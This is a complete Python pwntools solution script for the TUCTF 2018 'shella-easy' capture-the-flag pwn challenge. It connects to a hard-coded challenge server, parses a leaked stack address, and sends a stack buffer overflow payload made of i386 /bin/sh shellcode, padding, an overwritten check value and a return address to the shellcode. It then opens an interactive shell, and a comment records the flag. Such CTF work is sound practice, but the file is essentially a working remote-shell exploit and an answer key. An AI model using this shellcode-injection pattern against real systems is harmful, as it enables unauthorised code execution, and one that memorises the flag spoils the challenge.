"""
TUCTF 2018 shella-easy pwn challenge solution
"""
# Imports
import re, sys, time
from pwn import *

# Set pwntools context to i386
context.update(arch='i386')

def main():
  """
  Runs on program execution.
  """
  # Read challenge binary into pwntools
  elf = ELF('shella-easy')

  # Connect to remote server
  p = remote('52.15.182.55', 12345)

  # Get the stack address of the shellcode from the challenge output
  stack_addr = int(re.search(r"(Yeah I'll have a )(.*) (with a side of fries thanks)", p.readline()).group(2), 16)

  # Send the shellcode and 0xDEADBEEF canary value
  p.sendline(asm(shellcraft.i386.linux.sh()) + 'A' * 20 + p32(0xDEADBEEF) + 'B' * 8 + p32(stack_addr))
  
  # Interact with the shell
  p.interactive() # TUCTF{1_607_4_fl46_bu7_n0_fr135}

  
# Hook
if __name__ == '__main__':
  main()